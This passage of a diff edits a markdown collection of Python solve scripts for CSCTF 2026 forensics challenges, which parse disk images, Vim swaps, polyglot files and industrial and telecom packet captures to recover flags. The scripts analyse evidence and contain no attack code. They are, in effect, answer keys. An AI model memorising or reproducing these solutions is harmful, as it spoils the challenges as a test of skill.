-idat = body + d[iend_sec * SS:iend_sec * SS + last]
-crc_off = iend_sec * SS + last
-crc = d[crc_off:crc_off + 4]
-ok = zlib.crc32(b"IDAT" + idat) == struct.unpack(">I", crc)[0]
-print(f"pool={pool} idat={len(idat)}/{idat_len} crc_ok={ok}", file=sys.stderr)
-assert ok
-
-png = frag1[:41] + idat + crc + d[crc_off + 4:crc_off + 16]   # + IEND chunk
-open(sys.argv[2], "wb").write(png)
-print("wrote", sys.argv[2], len(png), "bytes")
-~~~~
-
-### Last Buffer — `solve/solve.py`
-
-~~~~python
-#!/usr/bin/env python3
-"""last-buffer: pick the Vim swap from the shell that died in the crash window, decode its proof.
-
-Usage: python3 -I solve.py ../files
-Pure data parsing (layout from vim-swap-layout.md): nothing is opened in Vim.
-"""
-import base64, hashlib, json, struct, sys
-from pathlib import Path
-
-d = Path(sys.argv[1])
-ctx = json.loads((d / "case-context.json").read_text())
-saved_sha = hashlib.sha256((d / ctx["saved_file"]).read_bytes()).hexdigest()
-audit = [json.loads(l) for l in (d / "audit-timeline.jsonl").read_text().splitlines()]
-# pid that ended with an abnormal exit (SIGHUP) on the target tty inside the crash window
-crash_pid = next(e["pid"] for e in audit if e["event"] == "ANOM_ABEND" and e["tty"] == ctx["target_tty"])
-
-
-def swap_lines(data):
-    """Lines of every data block (ID 0x6461): count @16 (u64), line-start indexes @24 (u32)."""
-    out = []
-    for off in range(0, len(data), 4096):
-        blk = data[off:off + 4096]
-        if len(blk) < 24 or struct.unpack("<H", blk[:2])[0] != 0x6461:
-            continue
-        n = struct.unpack("<Q", blk[16:24])[0]
-        idx = struct.unpack(f"<{n}I", blk[24:24 + 4 * n])
-        out += [blk[i:blk.index(b"\0", i)].decode() for i in idx]
-    return out
-
-
-for swp in sorted(d.glob("*.sw?")):
-    data = swp.read_bytes()
-    pid = struct.unpack("<I", data[24:28])[0]
-    lines = swap_lines(data)
-    kv = dict(l.split(": ", 1) for l in lines if ": " in l)
-    print(f"{swp.name}: pid={pid} revision={kv.get('revision_id')} base_sha_matches_saved="
-          f"{kv.get('base_file_sha256') == saved_sha}", file=sys.stderr)
-    if pid == crash_pid and kv.get("base_file_sha256") == saved_sha:
-        b = kv["authorization_b64"]
-        print(base64.urlsafe_b64decode(b + "=" * (-len(b) % 4)).decode())
-~~~~
-
-### Night Clerk — `solve/solve.py`
-
-~~~~python
-#!/usr/bin/env python3
-"""
-CSCTF 2026 — Night Clerk (forensics/easy)
-Recover a hidden coordination message from a seized NTFS stick image.
-
-Steps:
-  1. Extract night_audit.docx from the NTFS image (inode 66, deleted).
-  2. Parse the tracked insertion (w:ins) to get the hex-encoded ciphertext.
-  3. Brute-force single-byte XOR keys; the correct key yields a valid CSCTF{...} flag.
-
-Usage:
-    python3 solve.py [path/to/terminal.dd]
-"""
-
-import sys
-import subprocess
-import zipfile
-import xml.etree.ElementTree as ET
-
-IMG = sys.argv[1] if len(sys.argv) > 1 else "files/terminal.dd"
-DOCX_INODE = 66
-NS = {"w": "http://schemas.openxmlformats.org/wordprocessingml/2006/main"}
-
-# Step 1: extract docx bytes from NTFS image
-print("[*] Extracting night_audit.docx from NTFS image...")
-result = subprocess.run(
-    ["icat", IMG, str(DOCX_INODE)],
-    capture_output=True,
-)
-if result.returncode != 0:
-    print(f"[-] icat failed: {result.stderr.decode()}")
-    sys.exit(1)
-docx_bytes = result.stdout
-print(f"    {len(docx_bytes)} bytes extracted")
-
-# Step 2: parse tracked insertion from word/document.xml
-print("[*] Parsing tracked insertions...")
-import io
-z = zipfile.ZipFile(io.BytesIO(docx_bytes))
-doc_xml = z.read("word/document.xml")
-root = ET.fromstring(doc_xml)
-insertions = root.findall(".//w:ins", NS)
-print(f"    Found {len(insertions)} insertion(s)")
-
-hex_ciphertext = None
-for ins in insertions:
-    for t in ins.findall(".//w:t", NS):
-        if t.text and all(c in "0123456789abcdefABCDEF" for c in t.text):
-            hex_ciphertext = t.text
-            print(f"    Ciphertext (hex): {hex_ciphertext}")
-
-if not hex_ciphertext:
-    print("[-] No hex ciphertext found in tracked insertions.")
-    sys.exit(1)
-
-ciphertext = bytes.fromhex(hex_ciphertext)
-
-# Step 3: brute-force single-byte XOR key
-print("[*] Brute-forcing XOR key...")
-for key in range(256):
-    plaintext = bytes([b ^ key for b in ciphertext])
-    try:
-        s = plaintext.decode("ascii")
-        if s.startswith("CSCTF{") and s.endswith("}"):
-            print(f"\n[+] Key   : {key} (0x{key:02x})")
-            print(f"[+] Flag  : {s}")
-            sys.exit(0)
-    except UnicodeDecodeError:
-        pass
-
-print("[-] No valid flag found with single-byte XOR.")
-sys.exit(1)
 ~~~~
 
 ### Operation Dawn: The Burnt Server — `solve/solve.py`
@@ -6614,6 +6439,109 @@ if __name__ == "__main__":
     main()
 ~~~~
 
+### Phantom Drift — `solve/solve.py`
+
+~~~~python
+#!/usr/bin/env python3
+"""phantom-drift: derive the flag from the approved vs. diverted waypoint.
+
+Usage: python3 -I solve.py ../files
+Pure data analysis: the decompiled sources are only read (base64-decoded) and compared.
+"""
+import base64, hashlib, json, math, re, sys
+from pathlib import Path
+
+d = Path(sys.argv[1])
+
+# 0. The .decompiled files carry the source as base64 (to read, not to run).
+for name in ("drone_control.decompiled", "command_backend.decompiled"):
+    src = base64.b64decode(re.search(r'DECODED_CONTENT = "([^"]+)"', (d / name).read_text()).group(1)).decode()
+    print(f"{name}: {len(src)} chars of source", file=sys.stderr)
+
+# 1. Approved waypoint (manifest, also hard-coded in both validators).
+man = json.loads((d / "mission_manifest.json").read_text())
+a_lat, a_lon = man["approved_waypoint_lat"], man["approved_waypoint_lon"]
+
+# 2. The command that was actually sent: one JSON object holding the same fields twice,
+#    snake_case (approved values) and PascalCase (diverted values).
+tel = json.loads((d / "telemetry_logs.json").read_text())
+cmd = next(r for r in tel["readings"] if r.get("phase") == "waypoint_update")
+assert (cmd["waypoint_lat"], cmd["waypoint_lon"]) == (a_lat, a_lon)
+b_lat, b_lon = cmd["WaypointLat"], cmd["WaypointLon"]
+print(f"approved=({a_lat},{a_lon}) diverted=({b_lat},{b_lon})", file=sys.stderr)
+
+# 3. flight_log.bin: 24-byte header then "TAG:xxxxxxxx" XORed with the mission id as key.
+blob = (d / "flight_log.bin").read_bytes()[24:]
+key = man["mission_id"].encode()
+tag = bytes(c ^ key[i % len(key)] for i, c in enumerate(blob)).decode()
+assert tag.startswith("TAG:")
+tag = tag[4:]
+
+
+def haversine(r):
+    p1, p2 = math.radians(a_lat), math.radians(b_lat)
+    h = math.sin((p2 - p1) / 2) ** 2 + math.cos(p1) * math.cos(p2) * math.sin(math.radians(b_lon - a_lon) / 2) ** 2
+    return 2 * r * math.asin(math.sqrt(h))
+
+
+# 4. The statement does not fix the Earth radius: the tag (last 8 hex of the digest) decides.
+for name, r in (("mean 6371000", 6371000), ("WGS84 6378137", 6378137)):
+    s = f"{a_lat:.4f}{a_lon:.4f}{b_lat - a_lat:.6f}{b_lon - a_lon:.6f}{haversine(r):.1f}"
+    h = hashlib.sha256(s.encode()).hexdigest()
+    print(f"R={name}: {s} -> tag {h[-8:]} (expected {tag}) {'OK' if h[-8:] == tag else ''}", file=sys.stderr)
+    if h[-8:] == tag:
+        print("CSCTF{" + h[:16] + "}")
+~~~~
+
+### Polyglot Requiem — `solve/solve.py`
+
+~~~~python
+#!/usr/bin/env python3
+"""polyglot-requiem: PNG+ZIP polyglot -> SQLite deleted row -> assetsignd's seal scheme.
+
+Usage: python3 -I solve.py ../files/flight-telemetry-sdk
+Nothing is executed: the PNG is parsed by hand, the ZIP is read in memory, the SQLite
+file is searched as raw bytes (the row was deleted, SQLite would not show it), and the
+seal scheme of `assetsignd` (found by static analysis) is re-implemented:
+    msg = reverse(raw_bytes(tag)) || epoch as 8-byte little-endian
+    key = SHA-256(msg);  out[i] = in[i] XOR key[i mod 32]
+"""
+import hashlib, io, struct, subprocess, sys, zipfile
+from pathlib import Path
+
+repo = Path(sys.argv[1])
+png = (repo / "assets/telemetry_icon.png").read_bytes()
+
+# 1. Walk the PNG chunks: tEXt "Provenance" holds the tag; the ZIP is appended after IEND.
+off, tag = 8, None
+while True:
+    n, typ = struct.unpack(">I4s", png[off:off + 8])
+    if typ == b"tEXt":
+        k, _, v = png[off + 8:off + 8 + n].partition(b"\0")
+        if k == b"Provenance":
+            tag = bytes.fromhex(v.decode())
+    off += 12 + n
+    if typ == b"IEND":
+        break
+z = zipfile.ZipFile(io.BytesIO(png[off:]))                  # the "trailing data" is a ZIP
+db = z.read("telemetry_cache.db")
+print(f"tag={tag.hex()} zip members={z.namelist()}", file=sys.stderr)
+
+# 2. Deleted row: the cell is still in the page. Record = hdr_len, 0 (NULL id), text, blob.
+i = db.index(b"ci_provenance_seal")
+stype = db[i - 1]                                           # serial type of the blob column
+ct = db[i + 18:i + 18 + (stype - 12) // 2]
+print(f"deleted row ci_provenance_seal: {len(ct)}-byte blob", file=sys.stderr)
+
+# 3. Epoch = timestamp of the commit that added the icon (all commits share it anyway).
+epoch = int(subprocess.run(
+    ["git", "--git-dir", str(repo / ".git"), "log", "-1", "--format=%ct", "--", "assets/telemetry_icon.png"],
+    capture_output=True, text=True, check=True).stdout)
+
+key = hashlib.sha256(tag[::-1] + struct.pack("<Q", epoch)).digest()
+print(bytes(c ^ key[j % 32] for j, c in enumerate(ct)).decode())
+~~~~
+
 ### Redline — `solve/solve.py`
 
 ~~~~python
@@ -6781,6 +6709,78 @@ if __name__ == "__main__":
     main()
 ~~~~
 
+### Silent Breaker — `solve/solve.py`
+
+~~~~python
+#!/usr/bin/env python3
+"""silent-breaker: build the containment report from the case files and submit it.
+
+Usage: python3 -I solve.py http://<host>:<port> [--submit]
+Without --submit only the free GET routes (/files, /events) are used and the report is printed.
+With --submit it also calls /confirm-target (2 attempts!), /query/vpn-window and /submit.
+Each instance is a different case, so everything is derived from that instance's files.
+"""
+import json, re, struct, sys, urllib.parse, urllib.request
+from datetime import datetime, timezone
+
+base = sys.argv[1].rstrip("/")
+
+
+def get(path):
+    with urllib.request.urlopen(base + path, timeout=20) as r:
+        return r.read()
+
+
+def post(path, obj):
+    req = urllib.request.Request(base + path, json.dumps(obj).encode(), {"Content-Type": "application/json"})
+    with urllib.request.urlopen(req, timeout=20) as r:
+        return json.load(r)
+
+
+# 1. Signalling feed -> subscribers using a GT outside GT-0000..GT-0999, joined with the roster.
+events = json.loads(get("/events"))["signalling_events"]
+bad = {e["msisdn"] for e in events if not (m := re.fullmatch(r"GT-(\d{4})(?:-.*)?", e["gt"])) or int(m.group(1)) > 999}
+roster = json.loads(get("/files/roster.json"))["employees"]
+targets = [e for e in roster if e["msisdn"] in bad and e["ot_vpn_access"]]   # only staff with OT-VPN access can matter
+assert len(targets) == 1, targets
+emp = targets[0]["employee_id"]
+print("compromised employee:", emp, file=sys.stderr)
+
+# 2. Historian log -> the QUALITY=SUSPECT run and its frozen value.
+log = get("/files/hmi_monitoring.log").decode()
+suspect = re.findall(r"IOA=(0x[0-9a-f]+) VALUE=([\d.]+)A QUALITY=SUSPECT", log)
+ioa, frozen = suspect[0]
+print(f"suspect run: IOA {ioa}, frozen current {frozen}", file=sys.stderr)
+
+# 3. pcap -> C_SC_NA_1 (type 45) activation from the master (to port 2404): IOA, SCO, wire time.
+pcap = get("/files/iec104_capture.pcap")
+off = 24
+cmd = None
+while off + 16 <= len(pcap):
+    sec, usec, incl, _orig = struct.unpack("<IIII", pcap[off:off + 16])
+    pkt = pcap[off + 16:off + 16 + incl]
+    off += 16 + incl
+    ihl = (pkt[14] & 15) * 4
+    tcp = pkt[14 + ihl:]
+    payload = tcp[(tcp[12] >> 4) * 4:]
+    dport = struct.unpack(">H", tcp[2:4])[0]
+    if dport == 2404 and len(payload) >= 16 and payload[0] == 0x68 and payload[6] == 45 and payload[8] & 0x3F == 6:
+        ioa_w = payload[12] | payload[13] << 8 | payload[14] << 16
+        cmd = (f"{ioa_w:x}", "ON" if payload[15] & 1 else "OFF", datetime.fromtimestamp(sec, timezone.utc).strftime("%H:%M"))
+assert cmd and int(cmd[0], 16) == int(ioa, 16), (cmd, ioa)
+print("breaker command:", cmd, file=sys.stderr)
+
+report = {"ioa_address": cmd[0], "command_qualifier": cmd[1], "command_time_utc": cmd[2],
+          "telemetry_status": frozen, "vpn_session_id": None}
+if "--submit" in sys.argv:
+    print(post("/confirm-target", {"employee_id": emp}), file=sys.stderr)
+    vpn = json.loads(get("/query/vpn-window"))["vpn_sessions"]
+    report["vpn_session_id"] = next(s["session_id"] for s in vpn if s["employee_id"] == emp)
+    print(post("/submit", report))
+else:
+    print(json.dumps(report | {"vpn_session_id": "<from /query/vpn-window after confirm-target>", "employee_id": emp}, indent=1))
+~~~~
+
 ### Tone Burst — `solve/solve.py`
 
 ~~~~python
@@ -6819,6 +6819,146 @@ for shift in range(8):
     s = "".join(chr(int("".join(map(str, bits[i:i + 8])), 2)) for i in range(shift, len(bits) - 7, 8))
     if "CSCTF{" in s:
         print(s[s.index("CSCTF{"):].split("}")[0] + "}")
+~~~~
+
+### Dark Anchorage Reconciliation — `solve/solve.py`
+
+~~~~python
+#!/usr/bin/env python3
+"""Dark Anchorage Reconciliation - build the KALNET-RECON-1 report from the 4 evidence files and POST it.
+Usage: solve.py http://HOST:PORT [--post]"""
+import json, csv, math, statistics as st, sys, urllib.request
+from datetime import datetime, timedelta
+B = sys.argv[1] if len(sys.argv) > 1 else "http://w01.ctf.chronos-security.ro:36289"
+get = lambda p: urllib.request.urlopen(B + p).read().decode()
+R = 6378137
+fault = dict(l.split("=") for l in get("/files/cable-fault.txt").splitlines() if "=" in l)
+lat0, lon0 = float(fault["cable_lat"]), float(fault["cable_lon"])
+def loc(la, lo): return (R*math.cos(math.radians(lat0))*math.radians(lo-lon0), R*math.radians(la-lat0))
+P = lambda s: datetime.strptime(s, "%Y-%m-%dT%H:%M:%SZ")
+F = lambda d: d.strftime("%Y-%m-%dT%H:%M:%SZ")
+rad_txt = get("/files/radar.csv").splitlines()
+off = int([l for l in rad_txt if "utc_offset" in l][0].split("=")[1])
+rad = {}
+for r in csv.DictReader([l for l in rad_txt if not l.startswith("#")]):
+    rad.setdefault(r["radar_track"], {})[P(r["local_time"]) - timedelta(minutes=off)] = loc(float(r["lat"]), float(r["lon"]))
+ais = {}
+for l in get("/files/ais.ndjson").splitlines():
+    j = json.loads(l)
+    if j["type"] == "position": ais.setdefault(j["mmsi"], {})[P(j["utc"])] = loc(j["lat"], j["lon"])
+def resid(t, m):
+    ks = sorted(set(rad[t]) & set(ais[m]))
+    return ks, [(ais[m][k][0]-rad[t][k][0], ais[m][k][1]-rad[t][k][1]) for k in ks]
+def score(t, m):
+    ks, rs = resid(t, m)
+    return st.median(math.hypot(*r) for r in rs) if rs else 1e9
+assoc = {t: min(ais, key=lambda m: score(t, m)) for t in sorted(rad)}
+assert len(set(assoc.values())) == 16, assoc
+print({t: round(score(t, m), 1) for t, m in assoc.items()}, file=sys.stderr)
+# divergence
+best = None
+for t, m in assoc.items():
+    ks, rs = resid(t, m); mag = [math.hypot(*r) for r in rs]
+    i = 0
+    while i < len(ks):
+        if mag[i] < 250: i += 1; continue
+        j = i
+        while j+1 < len(ks) and mag[j+1] >= 250 and abs(rs[j+1][0]-rs[j][0]) <= 15 and abs(rs[j+1][1]-rs[j][1]) <= 15: j += 1
+        if j-i+1 >= 4 and (best is None or j-i > best[0]): best = (j-i, t, m, ks[i], ks[j], rs[i:j+1])
+        i = j+1
+_, bt, bm, s, e, rr = best
+mean = lambda v: math.floor(abs(sum(v)/len(v)) + .5) * (1 if sum(v) >= 0 else -1)
+div = {"mmsi": bm, "start_utc": F(s), "end_utc": F(e), "ais_minus_radar_east_m": mean([r[0] for r in rr]), "ais_minus_radar_north_m": mean([r[1] for r in rr])}
+# CPA: radar segments
+cp = None
+for t, d in rad.items():
+    ks = sorted(d)
+    for a, b in zip(ks, ks[1:]):
+        p, q = d[a], d[b]; v = (q[0]-p[0], q[1]-p[1]); vv = v[0]**2 + v[1]**2
+        u = 0 if vv == 0 else min(1, max(0, -(p[0]*v[0]+p[1]*v[1])/vv))
+        dist = math.hypot(p[0]+u*v[0], p[1]+u*v[1]); tt = a + (b-a)*u
+        if cp is None or dist < cp[0] - 1e-9: cp = (dist, tt, t)
+dist, tt, ct = cp
+import calendar
+sec = calendar.timegm(tt.utctimetuple()) + tt.microsecond/1e6; fl = math.floor(sec); fr = sec - fl
+tt = datetime(1970,1,1) + timedelta(seconds=fl + (1 if fr > .5 else 0))
+rep = {"version": "KALNET-RECON-1", "radar_utc_offset_minutes": off,
+       "associations": [{"radar_track": t, "mmsi": assoc[t]} for t in sorted(assoc)],
+       "divergence": div,
+       "closest_approach": {"mmsi": assoc[ct], "utc": F(tt), "distance_m": math.floor(dist*10+.5)/10}}
+print(json.dumps(rep))
+if "--post" in sys.argv:
+    req = urllib.request.Request(B + "/reconcile", json.dumps(rep).encode(), {"Content-Type": "application/json"})
+    try: print(urllib.request.urlopen(req).read().decode())
+    except urllib.error.HTTPError as ex: print(ex.code, ex.read().decode())
+~~~~
+
+### Ghost Signal — `solve/solve.py`
+
+~~~~python
+#!/usr/bin/env python3
+"""ghost-signal: cross-validate the SS7/Diameter/billing evidence and derive the marker.
+
+Usage: python3 -I solve.py ../files
+Requires tshark on PATH to read the two pcaps (SS7/MAP over M3UA, Diameter); the
+billing export is read directly as JSON. Nothing beyond these three files is used.
+"""
+import hashlib
+import json
+import subprocess
+import sys
+from pathlib import Path
+
+d = Path(sys.argv[1])
+
+
+def tshark_fields(pcap, *fields):
+    """List of dicts, one per frame that has at least one of the requested fields set."""
+    args = ["tshark", "-r", str(pcap), "-T", "fields", "-E", "separator=\t"]
+    for f in fields:
+        args += ["-e", f]
+    out = subprocess.run(args, capture_output=True, text=True, check=True).stdout
+    rows = []
+    for line in out.splitlines():
+        cells = line.split("\t")
+        row = dict(zip(fields, cells + [""] * (len(fields) - len(cells))))
+        if any(row.values()):
+            rows.append(row)
+    return rows
+
+
+# 1. Billing export: find the anomalous events -- every one carries an "anomaly" field.
+billing = json.loads((d / "billing_events.json").read_text())
+anomalous = [e for e in billing["events"] if "anomaly" in e]
+sessions = {e["session_id"] for e in anomalous}
+imsis = {e["imsi"] for e in anomalous}
+assert len(sessions) == 1 and len(imsis) == 1, "more than one anomalous thread -- narrow it down first"
+session_id, imsi = sessions.pop(), imsis.pop()
+first_ts = min(e["timestamp"] for e in anomalous)
+print(f"billing: session={session_id} imsi={imsi} first_anomalous_ts={first_ts}", file=sys.stderr)
+
+# 2. SS7 (MAP over M3UA/SCCP): the same IMSI shows up in an updateLocation from a GT that
+#    only appears once the attack window starts (49211, then 49311) -- never in the baseline
+#    traffic (which stays in the 49100-49144 range).
+ss7 = tshark_fields(d / "ss7_capture.pcap", "frame.time_epoch", "sccp.calling.digits", "e212.imsi")
+ss7_imsi_rows = [r for r in ss7 if r["e212.imsi"]]
+assert all(r["e212.imsi"] == imsi for r in ss7_imsi_rows) and ss7_imsi_rows, "SS7 IMSI mismatch"
+attack_gts = {r["sccp.calling.digits"] for r in ss7 if int(float(r["frame.time_epoch"])) >= first_ts}
+print(f"SS7: IMSI confirmed in updateLocation; attack-window calling GTs = {sorted(attack_gts)}", file=sys.stderr)
+
+# 3. Diameter: the exact Session-Id AVP on the wire, and the rogue Origin-Host it was served from.
+dia = tshark_fields(d / "diameter_capture.pcap", "diameter.Session-Id", "diameter.Origin-Host",
+                     "diameter.Subscription-Id-Data")
+match = [r for r in dia if r["diameter.Session-Id"] == session_id]
+assert match and all(r["diameter.Subscription-Id-Data"] == imsi for r in match if r["diameter.Subscription-Id-Data"])
+rogue_hosts = {r["diameter.Origin-Host"] for r in match} - {"hss.eastern-tele.ro"}
+print(f"Diameter: Session-Id confirmed on the wire; rogue Origin-Host(s) = {sorted(rogue_hosts)}", file=sys.stderr)
+
+# 4. Flag: sha256("<imsi>:<full_diameter_session_id>:<unix_timestamp>")[:8]
+text = f"{imsi}:{session_id}:{first_ts}"
+digest = hashlib.sha256(text.encode()).hexdigest()
+print(f"serialized: {text}", file=sys.stderr)
+print("CSCTF{" + digest[:8] + "}")
 ~~~~
 
 ### Grid Watch — `solve/solve.py`
@@ -7025,267 +7165,6 @@ def main():
 
 if __name__ == "__main__":
     main()
-~~~~
-
-### Ghost Signal — `solve/solve.py`
-
-~~~~python
-#!/usr/bin/env python3
-"""ghost-signal: cross-validate the SS7/Diameter/billing evidence and derive the marker.
-
-Usage: python3 -I solve.py ../files
-Requires tshark on PATH to read the two pcaps (SS7/MAP over M3UA, Diameter); the
-billing export is read directly as JSON. Nothing beyond these three files is used.
-"""
-import hashlib
-import json
-import subprocess
-import sys
-from pathlib import Path
-
-d = Path(sys.argv[1])
-
-
-def tshark_fields(pcap, *fields):
-    """List of dicts, one per frame that has at least one of the requested fields set."""
-    args = ["tshark", "-r", str(pcap), "-T", "fields", "-E", "separator=\t"]
-    for f in fields:
-        args += ["-e", f]
-    out = subprocess.run(args, capture_output=True, text=True, check=True).stdout
-    rows = []
-    for line in out.splitlines():
-        cells = line.split("\t")
-        row = dict(zip(fields, cells + [""] * (len(fields) - len(cells))))
-        if any(row.values()):
-            rows.append(row)
-    return rows
-
-
-# 1. Billing export: find the anomalous events -- every one carries an "anomaly" field.
-billing = json.loads((d / "billing_events.json").read_text())
-anomalous = [e for e in billing["events"] if "anomaly" in e]
-sessions = {e["session_id"] for e in anomalous}
-imsis = {e["imsi"] for e in anomalous}
-assert len(sessions) == 1 and len(imsis) == 1, "more than one anomalous thread -- narrow it down first"
-session_id, imsi = sessions.pop(), imsis.pop()
-first_ts = min(e["timestamp"] for e in anomalous)
-print(f"billing: session={session_id} imsi={imsi} first_anomalous_ts={first_ts}", file=sys.stderr)
-
-# 2. SS7 (MAP over M3UA/SCCP): the same IMSI shows up in an updateLocation from a GT that
-#    only appears once the attack window starts (49211, then 49311) -- never in the baseline
-#    traffic (which stays in the 49100-49144 range).
-ss7 = tshark_fields(d / "ss7_capture.pcap", "frame.time_epoch", "sccp.calling.digits", "e212.imsi")
-ss7_imsi_rows = [r for r in ss7 if r["e212.imsi"]]
-assert all(r["e212.imsi"] == imsi for r in ss7_imsi_rows) and ss7_imsi_rows, "SS7 IMSI mismatch"
-attack_gts = {r["sccp.calling.digits"] for r in ss7 if int(float(r["frame.time_epoch"])) >= first_ts}
-print(f"SS7: IMSI confirmed in updateLocation; attack-window calling GTs = {sorted(attack_gts)}", file=sys.stderr)
-
-# 3. Diameter: the exact Session-Id AVP on the wire, and the rogue Origin-Host it was served from.
-dia = tshark_fields(d / "diameter_capture.pcap", "diameter.Session-Id", "diameter.Origin-Host",
-                     "diameter.Subscription-Id-Data")
-match = [r for r in dia if r["diameter.Session-Id"] == session_id]
-assert match and all(r["diameter.Subscription-Id-Data"] == imsi for r in match if r["diameter.Subscription-Id-Data"])
-rogue_hosts = {r["diameter.Origin-Host"] for r in match} - {"hss.eastern-tele.ro"}
-print(f"Diameter: Session-Id confirmed on the wire; rogue Origin-Host(s) = {sorted(rogue_hosts)}", file=sys.stderr)
-
-# 4. Flag: sha256("<imsi>:<full_diameter_session_id>:<unix_timestamp>")[:8]
-text = f"{imsi}:{session_id}:{first_ts}"
-digest = hashlib.sha256(text.encode()).hexdigest()
-print(f"serialized: {text}", file=sys.stderr)
-print("CSCTF{" + digest[:8] + "}")
-~~~~
-
-### Water Hammer Reconciliation — `solve/solve.py`
-
-~~~~python
-#!/usr/bin/env python3
-"""water-hammer-reconciliation: rebuild the confirmed Modbus/TCP control history and its report hash.
-
-Usage: python3 -I solve.py ../files            (pure Python, no tshark needed)
-Implements the rules of station-profile.txt: reassembled TCP streams, strict ADU grammar,
-FC16 -> unique echo -> immediately-next FC3 readback with a unique matched response.
-"""
-import base64, hashlib, struct, sys
-from pathlib import Path
-
-d = Path(sys.argv[1])
-UNIT, SRV = 17, 502
-
-
-# ---- pcapng + Ethernet/IPv4/TCP -> per-direction reassembled byte streams with frame ordinals
-def frames(path):
-    buf, o = path.read_bytes(), 0
-    while o < len(buf):
-        bt, bl = struct.unpack("<II", buf[o:o + 8])
-        if bt == 6:                                                  # enhanced packet block
-            cl = struct.unpack("<I", buf[o + 20:o + 24])[0]
-            yield buf[o + 28:o + 28 + cl]
-        o += bl
-
-
-streams = {}                                                         # (sport, dport) -> {isn, bytes: {off: (byte, frame)}}
-for n, f in enumerate(frames(d / "reserve-header.pcapng"), 1):
-    if f[12:14] != b"\x08\x00" or f[23] != 6:
-        continue
-    ihl = (f[14] & 15) * 4
-    ip = f[14:14 + struct.unpack(">H", f[16:18])[0]]
-    t = ip[ihl:]
-    sp, dp, seq = struct.unpack(">HHI", t[:8])
-    s = streams.setdefault((sp, dp), {"isn": None, "pay": []})
-    if t[13] & 2:
-        s["isn"] = seq
-    pay = t[(t[12] >> 4) * 4:]
-    if pay:
-        s["pay"].append((seq, n, pay))
-
-
-def adus(stream):
-    place = {}
-    for seq, n, pay in stream["pay"]:
-        for i, b in enumerate(pay):
-            place.setdefault((seq + i - stream["isn"] - 1) & 0xFFFFFFFF, (b, n))   # first frame wins (retransmissions)
-    data = bytes(place[i][0] for i in range(len(place)))
-    frm = [place[i][1] for i in range(len(place))]
-    out, o = [], 0
-    while o + 6 <= len(data):
-        tid, pid, ln = struct.unpack(">HHH", data[o:o + 6])
-        end = o + 6 + ln
-        if pid != 0 or ln < 2 or end > len(data):                    # malformed / truncated: not an event
-            o = end if end <= len(data) else len(data)
-            continue
-        out.append({"tid": tid, "len": ln, "unit": data[o + 6], "pdu": data[o + 7:end], "frame": frm[end - 1]})
-        o = end
-    return out
-
-
-cli = next(v for k, v in streams.items() if k[1] == SRV)
-srv = next(v for k, v in streams.items() if k[0] == SRV)
-C, S = adus(cli), adus(srv)
-print(f"{len(C)} client ADUs, {len(S)} server ADUs", file=sys.stderr)
-
-# ---- confirmed snapshots
-snaps = []
-for ci, req in enumerate(C):
-    p = req["pdu"]
-    if req["unit"] != UNIT or not p or p[0] != 0x10 or len(p) < 6:
-        continue
-    A, N = struct.unpack(">HH", p[1:5])
-    if not (1 <= N <= 4 and 0x1000 <= A and A + N - 1 <= 0x1003 and req["len"] == 7 + 2 * N
-            and p[5] == 2 * N and len(p) == 6 + 2 * N):
-        continue
-    # unique pending response with the same tid
-    cand = [r for r in S if r["tid"] == req["tid"] and r["frame"] > req["frame"]]
-    if len(cand) != 1:
-        continue
-    resp = cand[0]
-    if not (resp["unit"] == UNIT and resp["len"] == 6 and resp["pdu"] == p[:5]):
-        continue
-    # immediately next client ADU after the positive response
-    nxt = next((c for c in C if c["frame"] > resp["frame"]), None)
-    if not (nxt and nxt["unit"] == UNIT and nxt["len"] == 6 and nxt["pdu"] == bytes.fromhex("0310000004")):
-        continue
-    rb = [r for r in S if r["tid"] == nxt["tid"] and r["frame"] > nxt["frame"]]
-    if len(rb) != 1:
-        continue
-    r3 = rb[0]
-    if not (r3["unit"] == UNIT and r3["len"] == 11 and r3["pdu"][:2] == b"\x03\x08" and len(r3["pdu"]) == 10):
-        continue
-    regs = struct.unpack(">4H", r3["pdu"][2:])
-    snaps.append((resp["frame"], resp["tid"], regs))
-snaps.sort()
-assert len(snaps) == 64, len(snaps)
-print(f"{len(snaps)} confirmed snapshots", file=sys.stderr)
-
-# ---- safety screen (integer arithmetic only)
-P0, G0, A0, R0 = 80, 500, 0, 60000
-T_US = 2 * 20000 * 1000000 // 1065000
-V = lambda p, g: (p * g // 1000) * 1000000 // 70686
-prevV, mask, lines = V(P0, G0), 0, []
-for i, (_, tid, (p, g, a, r)) in enumerate(snaps):
-    v = V(p, g)
-    q = 998 * 1065 * abs(v - prevV)
-    if a == 1 and r < T_US and q > 9000 * 100000:
-        mask |= 1 << (63 - i)
-    lines.append(f"i={i};tid={tid:04X};p={p};g={g};a={a};r={r}")
-    prevV = v
-
-R = "\n".join(["water-hammer-reconciliation-v2", f"initial;p={P0};g={G0};a={A0};r={R0}", "n=64"] + lines
-               + [f"unsafe-mask={mask:016X}"])
-digest = hashlib.sha256(R.encode()).digest()
-print("T_US =", T_US, "mask =", f"{mask:016X}", file=sys.stderr)
-print("CSCTF{" + base64.b32encode(digest[:24]).decode().rstrip("=") + "}")
-~~~~
-
-### Dark Anchorage Reconciliation — `solve/solve.py`
-
-~~~~python
-#!/usr/bin/env python3
-"""Dark Anchorage Reconciliation - build the KALNET-RECON-1 report from the 4 evidence files and POST it.
-Usage: solve.py http://HOST:PORT [--post]"""
-import json, csv, math, statistics as st, sys, urllib.request
-from datetime import datetime, timedelta
-B = sys.argv[1] if len(sys.argv) > 1 else "http://w01.ctf.chronos-security.ro:36289"
-get = lambda p: urllib.request.urlopen(B + p).read().decode()
-R = 6378137
-fault = dict(l.split("=") for l in get("/files/cable-fault.txt").splitlines() if "=" in l)
-lat0, lon0 = float(fault["cable_lat"]), float(fault["cable_lon"])
-def loc(la, lo): return (R*math.cos(math.radians(lat0))*math.radians(lo-lon0), R*math.radians(la-lat0))
-P = lambda s: datetime.strptime(s, "%Y-%m-%dT%H:%M:%SZ")
-F = lambda d: d.strftime("%Y-%m-%dT%H:%M:%SZ")
-rad_txt = get("/files/radar.csv").splitlines()
-off = int([l for l in rad_txt if "utc_offset" in l][0].split("=")[1])
-rad = {}
-for r in csv.DictReader([l for l in rad_txt if not l.startswith("#")]):
-    rad.setdefault(r["radar_track"], {})[P(r["local_time"]) - timedelta(minutes=off)] = loc(float(r["lat"]), float(r["lon"]))
-ais = {}
-for l in get("/files/ais.ndjson").splitlines():
-    j = json.loads(l)
-    if j["type"] == "position": ais.setdefault(j["mmsi"], {})[P(j["utc"])] = loc(j["lat"], j["lon"])
-def resid(t, m):
